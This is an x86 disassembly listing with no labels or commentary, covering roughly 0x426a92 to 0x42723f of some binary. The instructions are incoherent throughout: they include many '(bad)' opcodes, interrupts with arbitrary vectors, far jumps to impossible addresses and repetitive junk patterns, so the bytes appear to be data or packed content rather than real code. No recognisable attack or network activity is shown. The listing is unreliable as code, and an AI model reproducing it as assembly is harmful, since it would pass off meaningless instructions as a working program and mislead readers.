  426a92:	mov    eax,0xb4cf0a
  426a97:	add    BYTE PTR [eax],al
  426a99:	pop    ebp
  426a9a:	adc    BYTE PTR ds:0xab88080,dh
  426aa0:	push   es
  426aa1:	bound  eax,QWORD PTR [eax]
  426aa3:	add    BYTE PTR [eax],al
  426aa5:	int    0xd2
  426aa7:	mov    eax,0x94060a
  426aac:	add    BYTE PTR [eax],al
  426aae:	int    0xd3
  426ab0:	mov    eax,0x98060a
  426ab5:	add    BYTE PTR [eax],al
  426ab7:	add    al,0x6d
  426ab9:	sub    ch,cl
  426abb:	jge    0x426a75
  426abd:	or     cl,bh
  426abf:	mov    eax,0xcf000000
  426ac4:	mov    ch,BYTE PTR [eax]
  426ac6:	mov    eax,0xbccf0a
  426acb:	add    BYTE PTR [eax],al
  426acd:	add    al,0xd3
  426acf:	pusha  
  426ad0:	mov    eax,0xc0cf0a
  426ad5:	add    BYTE PTR [eax],al
  426ad7:	iret   
  426ad8:	mov    cl,BYTE PTR [edx-0x48]
  426adb:	or     cl,bh
  426add:	les    eax,FWORD PTR [eax]
  426adf:	add    BYTE PTR [eax],al
  426ae1:	int    0xf9
  426ae3:	mov    eax,0x9c670a
  426ae8:	add    BYTE PTR [eax],al
  426aea:	iret   
  426aeb:	loopne 0x426a8d
  426aed:	pop    edi
  426aee:	add    BYTE PTR ds:0xab88080,dh
  426af4:	iret   
  426af5:	enter  0x0,0x0
  426af9:	iret   
  426afa:	mov    bh,bh
  426afc:	mov    eax,0x90cf0a
  426b01:	add    BYTE PTR [eax],al
  426b03:	mov    eax,0xa0670a
  426b08:	add    BYTE PTR [eax],al
  426b0a:	add    al,0xc9
  426b0c:	stc    
  426b0d:	mov    eax,0xa4670a
  426b12:	add    BYTE PTR [eax],al
  426b14:	int    0xf9
  426b16:	pop    edi
  426b17:	leave  
  426b18:	xor    eax,0xab88080
  426b1d:	iret   
  426b1e:	add    BYTE PTR [eax],0x0
  426b21:	add    ch,cl
  426b23:	jge    0x426add
  426b25:	or     cl,bh
  426b27:	aam    0x0
  426b29:	add    BYTE PTR [eax],al
  426b2b:	int    0xc5
  426b2d:	mov    eax,0xe0060a
  426b32:	add    BYTE PTR [eax],al
  426b34:	cmp    ebp,DWORD PTR [ebp-0x48]
  426b37:	or     ah,BYTE PTR [edi-0x58]
  426b3a:	add    BYTE PTR [eax],al
  426b3c:	add    bh,cl
  426b3e:	addr16 in al,0x0
  426b41:	add    BYTE PTR [eax],al
  426b43:	leave  
  426b44:	push   es
  426b45:	lods   al,BYTE PTR ds:[esi]
  426b46:	add    BYTE PTR [eax],al
  426b48:	add    dh,ah
  426b4a:	xor    eax,0x6c9352b
  426b4f:	fadd   DWORD PTR [eax]
  426b51:	add    BYTE PTR [eax],al
  426b53:	jae    0x426b8a
  426b55:	jno    0x426b8c
  426b57:	mov    eax,0x3076cdaf
  426b5c:	int    0x8d
  426b5e:	xor    ch,cl
  426b60:	xchg   esi,eax
  426b61:	xor    BYTE PTR [edx+eax*1],al
  426b64:	call   ebx
  426b66:	repnz sub BYTE PTR [ebx],bh
  426b69:	jns    0x426b3e
  426b6b:	mov    ebp,0xcdd35392
  426b70:	lea    esi,[eax]
  426b72:	add    al,0x2
  426b74:	(bad)  
  426b75:	cmp    ebx,DWORD PTR [ecx-0x2cd70d2d]
  426b7b:	repz xchg edx,eax
  426b7d:	push   ebx
  426b7e:	jecxz  0x426bbb
  426b80:	retf   
  426b81:	add    al,0xd2
  426b83:	sbb    bl,BYTE PTR [ebx]
  426b85:	retf   
  426b86:	cmp    eax,DWORD PTR [eax]
  426b88:	inc    ebx
  426b89:	cli    
  426b8a:	das    
  426b8b:	or     cl,dl
  426b8d:	add    BYTE PTR [eax+0x43888280],0xd2
  426b94:	das    
  426b95:	add    al,0x37
  426b97:	add    BYTE PTR [eax+0x308dcd80],0xcd
  426b9e:	xchg   esi,eax
  426b9f:	xor    BYTE PTR [ebx],bh
  426ba1:	psrlq  mm5,mm3
  426ba4:	xchg   edx,eax
  426ba5:	add    al,0xfb
  426ba7:	call   ebx
  426ba9:	jmp    0xcd7d:0x87135328
  426bb0:	aad    0xb8
  426bb2:	cmp    edx,DWORD PTR ds:0x708d
  426bb8:	add    ch,cl
  426bba:	lea    esi,[eax]
  426bbc:	int    0xe6
  426bbe:	xor    BYTE PTR [ebx],bh
  426bc0:	psrlq  mm5,mm3
  426bc3:	xchg   edx,eax
  426bc4:	add    al,0xf8
  426bc6:	call   ebx
  426bc8:	jmp    0x8832bef5
  426bcd:	jge    0x426b87
  426bcf:	int    0xcc
  426bd1:	lea    esi,[eax+0x0]
  426bd4:	add    BYTE PTR [eax],al
  426bd6:	mov    eax,0xd3b8e3f8
  426bdb:	repnz das 
  426bdd:	mov    eax,0x53b8f3e3
  426be2:	jecxz  0x426bb1
  426be4:	lea    esi,[eax]
  426be6:	int    0xe6
  426be8:	xor    BYTE PTR [ebx],bh
  426bea:	psrlq  mm5,mm3
  426bed:	xchg   edx,eax
  426bee:	add    al,0xf8
  426bf0:	call   ebx
  426bf2:	jmp    0x8832bf1f
  426bf7:	jge    0x426bb1
  426bf9:	or     dl,BYTE PTR ds:0x708d
  426bff:	add    ch,cl
  426c01:	lea    esi,[eax]
  426c03:	int    0x96
  426c05:	xor    BYTE PTR [ebx],bh
  426c07:	(bad)  
  426c09:	sti    
  426c0a:	call   ebx
  426c0c:	jmp    0x426ba0
  426c0e:	shr    edx,cl
  426c10:	sub    BYTE PTR [ebx+0x13],dl
  426c13:	int    0x96
  426c15:	xor    BYTE PTR [edi+0x308dcdd3],al
  426c1b:	add    al,0x2
  426c1d:	(bad)  
  426c1e:	cmp    ebx,DWORD PTR [ecx-0x2cd70d2d]
  426c24:	repz xchg edx,eax
  426c26:	push   ebx
  426c27:	jecxz  0x426c64
  426c29:	retf   
  426c2a:	add    al,0xd2
  426c2c:	sbb    bl,BYTE PTR [ebx]
  426c2e:	retf   
  426c2f:	cmp    eax,DWORD PTR [eax]
  426c31:	inc    ebx
  426c32:	cli    
  426c33:	das    
  426c34:	or     ebp,DWORD PTR [esi+0x2f000000]
  426c3a:	pop    es
  426c3b:	pop    ebx
  426c3c:	add    BYTE PTR [eax],al
  426c3e:	add    bl,al
  426c40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426c41:	mov    esi,0x76cf4229
  426c46:	jne    0x426c52
  426c48:	jbe    0x426bd2
  426c4a:	int    0x76
  426c4c:	mov    BYTE PTR [edi+0x13de37b6],bh
  426c52:	or     bl,BYTE PTR [ecx+ecx*8]
  426c55:	ins    BYTE PTR es:[edi],dx
  426c56:	test   BYTE PTR [ebp-0x32dadcf6],bh
  426c5c:	jbe    0x426cd3
  426c5e:	int    0x8d
  426c60:	jge    0x426c91
  426c62:	inc    ebp
  426c63:	jge    0x426bf7
  426c65:	shr    ebx,cl
  426c67:	xchg   edx,eax
  426c68:	int    0x8d
  426c6a:	jne    0x426c39
  426c6c:	xchg   esi,eax
  426c6d:	jge    0x426caa
  426c6f:	leave  
  426c70:	cmp    ebx,edx
  426c72:	push   ebx
  426c73:	icebp  
  426c74:	int    0x76
  426c76:	cmc    
  426c77:	bound  eax,QWORD PTR [ebp-0x7f7f7edb]
  426c7d:	jo     0x426c4e
  426c7f:	push   es
  426c80:	cmc    
  426c81:	inc    DWORD PTR [eax]
  426c83:	add    BYTE PTR [eax-0x2d],dh
  426c86:	repnz sub BYTE PTR [ebp+0xf2a3],bh
  426c8d:	int    0x76
  426c8f:	in     eax,dx
  426c90:	int    0x8d
  426c92:	adc    DWORD PTR [edi],ebp
  426c94:	inc    ebp
  426c95:	jge    0x426c29
  426c97:	shr    ebx,cl
  426c99:	xchg   edx,eax
  426c9a:	int    0x8d
  426c9c:	in     eax,dx
  426c9d:	int    0x96
  426c9f:	adc    ebx,edx
  426ca1:	repnz sub ch,cl
  426ca4:	iret   
  426ca5:	cmc    
  426ca6:	inc    DWORD PTR [eax]
  426ca8:	add    ch,cl
  426caa:	mov    DWORD PTR [ebx],edi
  426cac:	leave  
  426cad:	cmp    ebx,edx
  426caf:	push   ebx
  426cb0:	rol    BYTE PTR [ebx+0x7d],cl
  426cb3:	das    
  426cb4:	push   es
  426cb5:	push   ebp
  426cb6:	add    BYTE PTR [eax-0xa293280],0xc9
  426cbd:	jbe    0x426ccc
  426cbf:	(bad)  
  426cc0:	ficom  WORD PTR ss:[ebx]
  426cc3:	pop    ebp
  426cc4:	mov    ebp,0xa25230a
  426cc9:	jbe    0x426cbc
  426ccb:	or     ah,BYTE PTR [esi-0x6289f56b]
  426cd1:	int    0x76
  426cd3:	xchg   ebp,eax
  426cd4:	int    0x8d
  426cd6:	popf   
  426cd7:	das    
  426cd8:	inc    ebp
  426cd9:	jge    0x426c6d
  426cdb:	shr    ebx,cl
  426cdd:	xchg   edx,eax
  426cde:	int    0x8d
  426ce0:	xchg   ebp,eax
  426ce1:	int    0x96
  426ce3:	popf   
  426ce4:	cmp    ecx,ecx
  426ce6:	cmp    ebx,edx
  426ce8:	push   ebx
  426ce9:	icebp  
  426cea:	bound  eax,QWORD PTR [eax]
  426cec:	(bad)  
  426ced:	xor    al,0xd3
  426cef:	repnz sub BYTE PTR [eax],al
  426cf2:	pop    ecx
  426cf3:	xor    eax,0xbd808081
  426cf8:	push   eax
  426cf9:	repnz add BYTE PTR [eax],al
  426cfc:	int    0x76
  426cfe:	xchg   ebp,eax
  426cff:	int    0x8d
  426d01:	popf   
  426d02:	das    
  426d03:	inc    ebp
  426d04:	jge    0x426c98
  426d06:	shr    ebx,cl
  426d08:	xchg   edx,eax
  426d09:	int    0x8d
  426d0b:	xchg   ebp,eax
  426d0c:	int    0x96
  426d0e:	popf   
  426d0f:	cmp    ecx,ecx
  426d11:	cmp    ebx,edx
  426d13:	push   ebx
  426d14:	icebp  
  426d15:	bound  eax,QWORD PTR [eax]
  426d17:	pop    ecx
  426d18:	xor    eax,0xd3808081
  426d1d:	repnz sub BYTE PTR [eax],al
  426d20:	pop    ecx
  426d21:	sub    eax,0xbd808081
  426d26:	xchg   edx,eax
  426d27:	repnz add BYTE PTR [eax],al
  426d2a:	int    0x7
  426d2c:	xor    eax,0xcd808081
  426d31:	mov    ch,cl
  426d33:	jle    0x426d99
  426d35:	xchg   DWORD PTR [eax-0x327772f6],ecx
  426d3b:	lea    ecx,ds:0x2ff176cd
  426d41:	inc    ebp
  426d42:	rcl    DWORD PTR [edx-0x326d422d],cl
  426d48:	jbe    0x426d57
  426d4a:	int    0x96
  426d4c:	icebp  
  426d4d:	cmp    esi,eax
  426d4f:	shr    DWORD PTR [ebp+0x536d3b28],cl
  426d55:	ror    ebp,cl
  426d57:	lea    ecx,[eax+0x187ebb2f]
  426d5d:	push   es
  426d5e:	jge    0x426d34
  426d60:	dec    esp
  426d61:	int    0x7
  426d63:	popf   
  426d64:	add    DWORD PTR [eax+0x4180c980],0xcd358621
  426d6e:	jbe    0x426dbc
  426d70:	int    0x76
  426d72:	xor    BYTE PTR [eax],al
  426d74:	(bad)  
  426d75:	cmp    al,0x0
  426d77:	(bad)  
  426d78:	cmc    
  426d79:	add    dh,dl
  426d7b:	sub    al,0x0
  426d7d:	(bad)  
  426d7e:	and    al,0x0
  426d80:	(bad)  
  426d81:	sbb    al,0x0
  426d83:	(bad)  
  426d84:	adc    al,0xbd
  426d86:	test   ch,dh
  426d88:	add    BYTE PTR [eax],al
  426d8a:	or     al,BYTE PTR [esi]
  426d8c:	adc    edi,edi
  426d8e:	add    BYTE PTR [eax],al
  426d90:	int    0x76
  426d92:	cmp    al,0x4
  426d94:	fcom   QWORD PTR [eax+eax*4]
  426d97:	aam    0x1a
  426d99:	int    0x76
  426d9b:	cmp    al,0x4
  426d9d:	fsub   QWORD PTR [eax+eax*4]
  426da0:	aam    0x4e
  426da2:	int    0x6
  426da4:	adc    edi,edi
  426da6:	add    BYTE PTR [eax],al
  426da8:	int    0x8d
  426daa:	cmp    al,0xa
  426dac:	outs   dx,BYTE PTR ds:[esi]
  426dad:	sbb    al,0xec
  426daf:	push   ebx
  426db0:	add    dh,dl
  426db2:	cmp    al,0x0
  426db4:	(bad)  
  426db5:	cmc    
  426db6:	mov    ebp,0x6daa
  426dbb:	stos   BYTE PTR es:[edi],al
  426dbc:	test   al,0x63
  426dbe:	retf   
  426dbf:	shl    BYTE PTR [eax+eax*4],cl
  426dc2:	xchg   esi,eax
  426dc3:	int    0xed
  426dc5:	jno    0x426e38
  426dc7:	cwde   
  426dc8:	leave  
  426dc9:	jbe    0x426dc8
  426dcb:	dec    ecx
  426dcc:	and    DWORD PTR [esi-0x68936cb],eax
  426dd2:	inc    ecx
  426dd3:	and    DWORD PTR [esi-0x28932cb],eax
  426dd9:	int    0xd6
  426ddb:	std    
  426ddc:	sar    bh,0x5f
  426ddf:	shl    DWORD PTR [ecx],1
  426de1:	xchg   BYTE PTR ds:0x3ba0d33b,dh
  426de7:	sti    
  426de8:	sar    DWORD PTR [ebp+0x28b9d392],cl
  426dee:	push   ebx
  426def:	jns    0x426dbe
  426df1:	(bad)  
  426df2:	mov    BYTE PTR [ebx+0x11],al
  426df5:	int    0x76
  426df7:	std    
  426df8:	aam    0xc4
  426dfa:	int    0xd6
  426dfc:	std    
  426dfd:	cmp    edx,ebx
  426dff:	cmp    edi,ebx
  426e01:	sar    DWORD PTR [ecx-0x6d422cd8],cl
  426e07:	push   ebx
  426e08:	jns    0x426dd7
  426e0a:	(bad)  
  426e0b:	dec    esp
  426e0c:	inc    ebx
  426e0d:	adc    esp,edx
  426e0f:	pop    ebx
  426e10:	int    0x96
  426e12:	xor    BYTE PTR [edx-0x32b31933],bl
  426e18:	jbe    0x426da2
  426e1a:	cmp    esi,edi
  426e1c:	push   es
  426e1d:	add    ah,dl
  426e1f:	push   esi
  426e20:	pop    ebx
  426e21:	retf   0x8624
  426e24:	or     DWORD PTR [esi-0x59a6d0d1],esp
  426e2a:	das    
  426e2b:	push   es
  426e2c:	fcmovbe st,st(6)
  426e2e:	dec    esi
  426e2f:	add    al,0xf4
  426e31:	adc    DWORD PTR [edx],0xffffffc5
  426e34:	fwait
  426e35:	add    BYTE PTR [eax+0x2fa60980],0xec
  426e3c:	dec    esp
  426e3d:	adc    ch,ah
  426e3f:	in     eax,dx
  426e40:	add    BYTE PTR [eax+0x2fa60980],0xf1
  426e47:	lea    ebp,[edi]
  426e49:	retf   0x2fa6
  426e4c:	or     DWORD PTR [esi+eax*4],esp
  426e4f:	js     0x426e94
  426e51:	clc    
  426e52:	or     BYTE PTR [esi],0x63
  426e55:	int    0x76
  426e57:	stc    
  426e58:	cmp    edx,ebx
  426e5a:	int    0x8d
  426e5c:	stc    
  426e5d:	add    al,0x2
  426e5f:	jmp    FWORD PTR [edx+0x76cd4aec]
  426e65:	std    
  426e66:	cmp    edx,ebx
  426e68:	int    0x8d
  426e6a:	std    
  426e6b:	cmp    edx,DWORD PTR [ebx]
  426e6d:	shl    edx,cl
  426e6f:	sub    bl,dl
  426e71:	mov    ebp,0xa8d35392
  426e76:	retf   
  426e77:	ror    BYTE PTR [eax+eax*4-0x6a],cl
  426e7b:	int    0xed
  426e7d:	add    al,0xed
  426e7f:	(bad)  
  426e80:	leave  
  426e81:	jbe    0x426e80
  426e83:	dec    ecx
  426e84:	and    DWORD PTR [esi+0x21416135],eax
  426e8a:	xchg   BYTE PTR ds:0xcdf9960a,dh
  426e90:	jbe    0x426ea6
  426e92:	or     dh,BYTE PTR [esi+0x14]
  426e95:	int    0x76
  426e97:	adc    al,0xcd
  426e99:	add    DWORD PTR ds:0xcd808081,ebp
  426e9f:	lea    edx,[ecx*8+0x2d0acd80]
  426ea6:	add    DWORD PTR [eax-0x78763280],0xa5b647c
  426eb0:	lea    esi,[ebp-0x32028933]
  426eb6:	(bad)  
  426eb7:	std    
  426eb8:	cwde   
  426eb9:	call   0x3b85:0x82cfffc0
  426ec0:	jns    0x426e95
  426ec2:	mov    ebp,0xf03baa92
  426ec7:	shl    edx,cl
  426ec9:	sub    BYTE PTR [ebx-0x2d],dl
  426ecc:	or     dh,BYTE PTR [esi-0x63]
  426ecf:	int    0x76
  426ed1:	std    
  426ed2:	int    0x8d
  426ed4:	std    
  426ed5:	cmp    edi,DWORD PTR [ecx-0x2d]
  426ed8:	mov    ebp,0xd3f03b92
  426edd:	repnz sub BYTE PTR [ebx-0x2d],dl
  426ee1:	or     dh,BYTE PTR [esi-0x53]
  426ee4:	int    0x76
  426ee6:	mov    ch,0xcd
  426ee8:	ins    BYTE PTR es:[edi],dx
  426ee9:	jo     0x426eef
  426eeb:	mov    ebp,0xf1760a4c
  426ef0:	int    0x76
  426ef2:	mov    ch,0xcd
  426ef4:	ins    BYTE PTR es:[edi],dx
  426ef5:	pop    esp
  426ef6:	int    0x8d
  426ef8:	mov    ch,0x7c
  426efa:	push   es
  426efb:	outs   dx,BYTE PTR ds:[esi]
  426efc:	xchg   esp,eax
  426efd:	int    0x76
  426eff:	mov    ch,0xd4
  426f01:	sbb    al,0xcd
  426f03:	ins    BYTE PTR es:[edi],dx
  426f04:	pop    esp
  426f05:	int    0x8d
  426f07:	mov    ch,0xcd
  426f09:	jle    0x426e9f
  426f0b:	jl     0x426f05
  426f0d:	icebp  
  426f0e:	sub    edi,DWORD PTR [ebp-0x33]
  426f11:	jbe    0x426ec8
  426f13:	int    0x6c
  426f15:	pop    esp
  426f16:	xchg   ebx,edx
  426f18:	in     al,dx
  426f19:	xchg   ebp,ecx
  426f1b:	ins    BYTE PTR es:[edi],dx
  426f1c:	xchg   esp,eax
  426f1d:	or     dh,BYTE PTR [esi-0x43]
  426f20:	int    0x76
  426f22:	std    
  426f23:	int    0x8d
  426f25:	std    
  426f26:	cmp    edi,DWORD PTR [ecx+0x3b]
  426f29:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  426f30:	push   ebx
  426f31:	ror    DWORD PTR [edx],cl
  426f33:	jbe    0x426f49
  426f35:	int    0x76
  426f37:	std    
  426f38:	int    0x8d
  426f3a:	std    
  426f3b:	cmp    edi,DWORD PTR [ecx+0x3b]
  426f3e:	lock shl edx,cl
  426f41:	sub    bl,dl
  426f43:	mov    ebp,0xad35392
  426f48:	jbe    0x426f5e
  426f4a:	int    0x76
  426f4c:	std    
  426f4d:	int    0x8d
  426f4f:	std    
  426f50:	cmp    esi,eax
  426f52:	cmp    edi,DWORD PTR [ecx-0x2d]
  426f55:	repnz sub bl,dl
  426f58:	mov    ebp,0xcdd35392
  426f5d:	lea    esi,[eax]
  426f5f:	or     al,BYTE PTR [ecx-0x36eb69f6]
  426f65:	jbe    0x426f7b
  426f67:	cmp    DWORD PTR [ecx],esp
  426f69:	xchg   BYTE PTR ds:0xb21476c9,dh
  426f6f:	and    DWORD PTR [esi+0x1476c935],eax
  426f75:	imul   esp,DWORD PTR [ecx],0x36eb3586
  426f7b:	xchg   BYTE PTR [eax-0x2893280],al
  426f81:	int    0x8d
  426f83:	std    
  426f84:	cmp    edi,DWORD PTR [ecx+0x3b]
  426f87:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  426f8e:	push   ebx
  426f8f:	ror    DWORD PTR [edx],cl
  426f91:	jbe    0x426f40
  426f93:	int    0x76
  426f95:	mov    ebp,0xa4c7687
  426f9a:	jbe    0x426f39
  426f9c:	add    dh,dl
  426f9e:	popf   
  426f9f:	add    dh,dl
  426fa1:	dec    esp
  426fa2:	int    0x8d
  426fa4:	mov    ch,0xbd
  426fa6:	neg    bh
  426fa8:	add    BYTE PTR [eax],al
  426faa:	or     dh,BYTE PTR [esi+0x14]
  426fad:	int    0x76
  426faf:	adc    al,0x6
  426fb1:	ins    DWORD PTR es:[edi],dx
  426fb2:	aam    0x60
  426fb4:	int    0x76
  426fb6:	popf   
  426fb7:	or     dh,BYTE PTR [esi-0x5b]
  426fba:	int    0x76
  426fbc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426fbd:	int    0x8d
  426fbf:	dec    esp
  426fc0:	xor    edx,ebx
  426fc2:	or     dh,BYTE PTR [esi-0x5b]
  426fc5:	int    0x76
  426fc7:	adc    al,0xcd
  426fc9:	lea    edx,[ecx*8+0x6e87306c]
  426fd0:	dec    esp
  426fd1:	int    0x8d
  426fd3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426fd4:	inc    ebx
  426fd5:	jge    0x426f59
  426fd7:	sbb    ch,cl
  426fd9:	jbe    0x426fef
  426fdb:	int    0x6c
  426fdd:	dec    esp
  426fde:	int    0x8d
  426fe0:	adc    al,0x87
  426fe2:	outs   dx,BYTE PTR ds:[esi]
  426fe3:	mov    ch,cl
  426fe5:	lea    esp,[ebp-0x2e142ccd]
  426feb:	test   DWORD PTR [eax+0x2149bf80],eax
  426ff1:	xchg   BYTE PTR ds:0xc90da60a,dh
  426ff7:	jbe    0x427076
  426ff9:	inc    ecx
  426ffa:	and    DWORD PTR [esi+0x7576c935],eax
  427000:	cmp    DWORD PTR [ecx],esp
  427002:	xchg   BYTE PTR ds:0xb26d76c9,dh
  427008:	and    DWORD PTR [esi+0xd76cf35],eax
  42700e:	or     dh,BYTE PTR [esi-0xb]
  427011:	iret   
  427012:	jbe    0x427091
  427014:	or     dh,BYTE PTR [esi+0x11]
  427017:	iret   
  427018:	jbe    0x42708f
  42701a:	or     dh,BYTE PTR [esi+0x14]
  42701d:	iret   
  42701e:	jbe    0x42708d
  427020:	or     dh,BYTE PTR [esi-0x13]
  427023:	int    0x76
  427025:	std    
  427026:	int    0x8d
  427028:	std    
  427029:	cmp    edi,DWORD PTR [ecx+0x3b]
  42702c:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  427033:	push   ebx
  427034:	ror    DWORD PTR [edx],cl
  427036:	jbe    0x426fdd
  427038:	jmp    0x42704d
  42703a:	xchg   DWORD PTR [eax-0x4d03ed80],eax
  427040:	and    DWORD PTR [esi-0x22fad0cb],eax
  427046:	xchg   DWORD PTR [eax+0x4cc080],eax
  42704c:	(bad)  
  42704d:	popf   
  42704e:	iret   
  42704f:	jbe    0x427021
  427051:	jo     0x427010
  427053:	xlat   BYTE PTR ds:[ebx]
  427054:	fild   WORD PTR [eax]
  427056:	add    ch,cl
  427058:	jbe    0x427053
  42705a:	int    0x8d
  42705c:	stc    
  42705d:	cmp    edi,DWORD PTR [ecx+0x3b]
  427060:	lock shl edx,cl
  427063:	sub    bl,dl
  427065:	mov    ebp,0xad35392
  42706a:	jbe    0x427019
  42706c:	or     ah,BYTE PTR [esi-0x6a29ae6b]
  427072:	int    0x76
  427074:	xchg   ebp,eax
  427075:	sar    DWORD PTR [ebp-0x2c1ec46e],cl
  42707b:	in     eax,0x28
  42707d:	push   ebx
  42707e:	popf   
  42707f:	or     ah,BYTE PTR [esi-0x689325b]
  427085:	int    0x8d
  427087:	stc    
  427088:	cmp    esi,eax
  42708a:	shl    edx,cl
  42708c:	sub    BYTE PTR [ebx],bh
  42708e:	jns    0x427063
  427090:	mov    ebp,0xcdd35392
  427095:	(bad)  
  427096:	stc    
  427097:	int    0x96
  427099:	stc    
  42709a:	cmp    ecx,DWORD PTR [edi]
  42709c:	cmp    ebx,ecx
  42709e:	shr    ebx,cl
  4270a0:	xchg   edx,eax
  4270a1:	shr    edx,cl
  4270a3:	sub    BYTE PTR [ebx+0x13],dl
  4270a6:	xchg   ebx,edx
  4270a8:	int    0x8d
  4270aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4270ab:	or     ah,BYTE PTR [esi-0x2982bc9b]
  4270b1:	sub    ch,cl
  4270b3:	jbe    0x4270ae
  4270b5:	int    0x8d
  4270b7:	stc    
  4270b8:	cmp    edi,DWORD PTR [ecx+0x3b]
  4270bb:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  4270c2:	push   ebx
  4270c3:	shl    DWORD PTR [eax-0x40],cl
  4270c6:	dec    esp
  4270c7:	iret   
  4270c8:	jbe    0x42709a
  4270ca:	jo     0x427089
  4270cc:	sti    
  4270cd:	std    
  4270ce:	add    BYTE PTR [eax],al
  4270d0:	int    0x76
  4270d2:	std    
  4270d3:	int    0x8d
  4270d5:	std    
  4270d6:	cmp    edi,DWORD PTR [ecx+0x3b]
  4270d9:	lock shl edx,cl
  4270dc:	sub    bl,dl
  4270de:	mov    ebp,0xcdd35392
  4270e3:	lea    esp,[ebp+0x28d47d43]
  4270e9:	int    0x76
  4270eb:	std    
  4270ec:	int    0x8d
  4270ee:	std    
  4270ef:	cmp    edi,DWORD PTR [ecx+0x3b]
  4270f2:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  4270f9:	push   ebx
  4270fa:	shl    DWORD PTR [eax-0x40],cl
  4270fd:	dec    esp
  4270fe:	iret   
  4270ff:	jbe    0x4270d1
  427101:	jo     0x4270c0
  427103:	mov    edi,0xcd0000fd
  427108:	jbe    0x4270ff
  42710a:	int    0x8d
  42710c:	cmc    
  42710d:	int    0x89
  42710f:	int    0x80
  427111:	cmp    esi,eax
  427113:	cmp    edi,DWORD PTR [ecx-0x2d]
  427116:	repnz sub bl,dl
  427119:	mov    ebp,0xcad35392
  42711e:	je     0x4270a5
  427120:	ror    ch,1
  427122:	(bad)  
  427123:	std    
  427124:	int    0x96
  427126:	std    
  427127:	cmp    ecx,DWORD PTR [edi]
  427129:	cmp    ebx,ecx
  42712b:	shr    ebx,cl
  42712d:	xchg   edx,eax
  42712e:	shr    edx,cl
  427130:	sub    BYTE PTR [edi],ch
  427132:	pop    ecx
  427133:	ins    DWORD PTR es:[edi],dx
  427134:	push   ebx
  427135:	adc    eax,DWORD PTR [ebx-0x2d]
  427138:	das    
  427139:	add    eax,0x80809212
  42713e:	int    0x76
  427140:	adc    ebp,ecx
  427142:	lea    edx,[ecx]
  427144:	int    0x89
  427146:	int    0x80
  427148:	cmp    esi,eax
  42714a:	cmp    edi,DWORD PTR [ecx-0x2d]
  42714d:	repnz sub bl,dl
  427150:	mov    ebp,0xcad35392
  427155:	je     0x4270dc
  427157:	ror    ch,1
  427159:	(bad)  
  42715a:	std    
  42715b:	int    0x96
  42715d:	std    
  42715e:	cmp    ecx,DWORD PTR [edi]
  427160:	cmp    ebx,ecx
  427162:	shr    ebx,cl
  427164:	xchg   edx,eax
  427165:	shr    edx,cl
  427167:	sub    BYTE PTR [edi],ch
  427169:	pop    ecx
  42716a:	ins    DWORD PTR es:[edi],dx
  42716b:	push   ebx
  42716c:	adc    eax,DWORD PTR [ebx-0x2d]
  42716f:	das    
  427170:	add    eax,0x8080928a
  427175:	int    0x76
  427177:	adc    al,0xcd
  427179:	lea    edx,[ecx*8+0x3b80cd89]
  427180:	lock cmp edi,DWORD PTR [ecx-0x2d]
  427184:	repnz sub bl,dl
  427187:	mov    ebp,0xcad35392
  42718c:	je     0x427113
  42718e:	ror    ch,1
  427190:	(bad)  
  427191:	std    
  427192:	int    0x96
  427194:	std    
  427195:	cmp    ecx,DWORD PTR [edi]
  427197:	cmp    ebx,ecx
  427199:	shr    ebx,cl
  42719b:	xchg   edx,eax
  42719c:	shr    edx,cl
  42719e:	sub    BYTE PTR [edi],ch
  4271a0:	pop    ecx
  4271a1:	ins    DWORD PTR es:[edi],dx
  4271a2:	push   ebx
  4271a3:	adc    eax,DWORD PTR [ebx-0x2d]
  4271a6:	das    
  4271a7:	add    eax,0x8080921b
  4271ac:	int    0x76
  4271ae:	in     eax,dx
  4271af:	int    0x8d
  4271b1:	in     eax,dx
  4271b2:	int    0x89
  4271b4:	int    0x80
  4271b6:	cmp    esi,eax
  4271b8:	cmp    edi,DWORD PTR [ecx-0x2d]
  4271bb:	repnz sub bl,dl
  4271be:	mov    ebp,0xcad35392
  4271c3:	je     0x42714a
  4271c5:	ror    ch,1
  4271c7:	(bad)  
  4271c8:	std    
  4271c9:	int    0x96
  4271cb:	std    
  4271cc:	cmp    ecx,DWORD PTR [edi]
  4271ce:	cmp    ebx,ecx
  4271d0:	shr    ebx,cl
  4271d2:	xchg   edx,eax
  4271d3:	shr    edx,cl
  4271d5:	sub    BYTE PTR [edi],ch
  4271d7:	pop    ecx
  4271d8:	ins    DWORD PTR es:[edi],dx
  4271d9:	push   ebx
  4271da:	adc    eax,DWORD PTR [ebx-0x2d]
  4271dd:	das    
  4271de:	add    eax,0x808081a5
  4271e3:	int    0x76
  4271e5:	adc    ebp,ecx
  4271e7:	lea    edx,[ecx]
  4271e9:	int    0x89
  4271eb:	int    0x80
  4271ed:	cmp    esi,eax
  4271ef:	shl    edx,cl
  4271f1:	sub    BYTE PTR [ebx],bh
  4271f3:	jns    0x4271c8
  4271f5:	mov    ebp,0xcad35392
  4271fa:	je     0x427181
  4271fc:	ror    ch,1
  4271fe:	(bad)  
  4271ff:	cmc    
  427200:	int    0x89
  427202:	int    0x96
  427204:	cmc    
  427205:	int    0x22
  427207:	cmp    ecx,DWORD PTR [edi]
  427209:	shr    ebx,cl
  42720b:	xchg   edx,eax
  42720c:	cmp    ebx,ecx
  42720e:	shr    edx,cl
  427210:	sub    BYTE PTR [ebx+0x13],dl
  427213:	retf   0x4d8c
  427216:	rol    BYTE PTR [edx-0x2d],1
  427219:	int    0x8d
  42721b:	adc    al,0xcd
  42721d:	mov    ebp,ecx
  42721f:	xchg   esi,eax
  427220:	adc    al,0xcd
  427222:	and    bh,BYTE PTR [ebx]
  427224:	psrlq  mm5,mm3
  427227:	xchg   edx,eax
  427228:	cmp    ebx,ecx
  42722a:	shr    edx,cl
  42722c:	sub    BYTE PTR [ebx+0x13],dl
  42722f:	retf   0x4d8c
  427232:	ror    BYTE PTR [edx-0x2d],1
  427235:	int    0x8d
  427237:	cmc    
  427238:	int    0x89
  42723a:	int    0x96
  42723c:	cmc    
  42723d:	int    0x22
  42723f:	cmp    ecx,DWORD PTR [edi]
